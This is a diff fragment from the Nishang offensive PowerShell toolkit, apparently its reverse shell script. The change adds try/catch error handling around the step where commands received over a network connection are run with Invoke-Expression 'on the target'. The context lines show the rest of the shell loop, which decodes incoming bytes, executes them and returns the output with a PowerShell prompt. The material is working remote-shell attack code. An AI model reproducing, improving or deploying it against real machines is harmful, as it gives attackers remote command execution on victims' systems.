@@ -92,10 +92,16 @@ https://github.com/samratashok/nishang
         {
             $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
             $data = $EncodedText.GetString($bytes,0, $i)
-        
-            #Execute the command on the target.
-            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
-
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
             $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
             $x = ($error[0] | Out-String)
             $error.clear()
